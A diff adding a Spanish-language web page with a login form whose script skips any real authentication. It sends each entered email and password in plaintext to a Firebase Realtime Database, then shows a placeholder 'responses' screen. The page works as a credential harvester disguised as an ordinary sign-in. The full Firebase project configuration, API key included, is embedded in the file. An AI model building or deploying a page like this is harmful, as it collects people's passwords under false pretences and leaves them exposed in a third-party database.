@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Respuestas</title>
+    <link rel="stylesheet" href="scratch.css">
+</head>
+<body>
+
+    <!-- Formulario de Inicio de Sesión -->
+    <div id="loginForm" class="form-container">
+        <h2>Iniciar sesión</h2>
+        <form id="login">
+            <div class="input-group">
+                <input type="email" id="username" placeholder="Correo electrónico" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Contraseña" required>
+            </div>
+            <button type="submit" class="btn">Acceder</button>
+        </form>
+    </div>
+    
+    <!-- Formulario de Respuestas -->
+    <div id="responsesForm" class="form-container" style="display:none;">
+        <h2>Formulario de Respuestas</h2>
+        <form id="responseForm">
+            <h3>Correo y Contraseña enviados</h3>
+            <button type="submit" class="btn">Enviar Respuesta</button>
+        </form>
+
+        <h3>Respuestas Recibidas</h3>
+        <div id="responseContainer"></div>
+        <button id="logout" class="btn">Cerrar Sesión</button>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        // Importar Firebase
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
+        import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js"; // Importar Realtime Database
+
+        document.addEventListener("DOMContentLoaded", () => {
+            // Configuración de Firebase
+            const firebaseConfig = {
+                apiKey: "AIzaSyAw6_-fB9f3xi6feMwKnY6gejoOqXkvtCE",
+                authDomain: "web-inicio-sesion-c8e9f.firebaseapp.com",
+                databaseURL: "https://web-inicio-sesion-c8e9f-default-rtdb.europe-west1.firebasedatabase.app",
+                projectId: "web-inicio-sesion-c8e9f",
+                storageBucket: "web-inicio-sesion-c8e9f.firebasestorage.app",
+                messagingSenderId: "422022760273",
+                appId: "1:422022760273:web:20d8e37e976876f1b8b570",
+                measurementId: "G-DXZ08ZYVHY"
+            };
+
+            // Inicializar Firebase
+            const app = initializeApp(firebaseConfig);
+            const db = getDatabase(app);
+
+            // Elementos del DOM
+            const loginForm = document.getElementById("loginForm");
+            const responsesForm = document.getElementById("responsesForm");
+            const responseForm = document.getElementById("responseForm");
+            const responseContainer = document.getElementById("responseContainer");
+            const logout = document.getElementById("logout");
+
+            // Función para cargar respuestas desde Firebase
+            function cargarRespuestas() {
+                responseContainer.innerHTML = ""; // Limpiar respuestas previas
+                const respuestasRef = ref(db, "respuestas");
+
+                onValue(respuestasRef, (snapshot) => {
+                    responseContainer.innerHTML = ""; // Limpiar antes de agregar nuevas respuestas
+                    snapshot.forEach((childSnapshot) => {
+                        const respuesta = childSnapshot.val().texto;
+                        const div = document.createElement("div");
+                        div.classList.add("response");
+                        div.textContent = respuesta;
+                        responseContainer.appendChild(div);
+                    });
+                });
+            }
+
+            // Manejo de inicio de sesión (ficticio, solo para mostrar la segunda pantalla)
+            loginForm.addEventListener("submit", function(event) {
+                event.preventDefault();
+
+                const email = document.getElementById("username").value;
+                const password = document.getElementById("password").value;
+
+                // Aquí, no estamos validando el correo ni la contraseña, simplemente ocultamos el login y mostramos el formulario de respuestas.
+                if (email && password) {
+                    loginForm.style.display = "none";
+                    responsesForm.style.display = "block";
+                    
+                    // Guardamos el correo y la contraseña en Firebase
+                    const respuestasRef = ref(db, "respuestas");
+                    push(respuestasRef, {
+                        email: email,
+                        password: password,
+                        timestamp: Date.now()
+                    }).then(() => {
+                        console.log("Correo y Contraseña guardados correctamente");
+                    }).catch((error) => {
+                        console.error("Error al guardar datos en Firebase:", error);
+                    });
+
+                    cargarRespuestas();
+                } else {
+                    alert("Por favor ingresa un correo y una contraseña.");
+                }
+            });
+
+            // Cerrar sesión
+            logout.addEventListener("click", function() {
+                loginForm.style.display = "block";
+                responsesForm.style.display = "none";
+            });
+
+            // Cargar respuestas al cargar la página
+            cargarRespuestas();
+        });
+    </script>
+
+</body>
+</html>
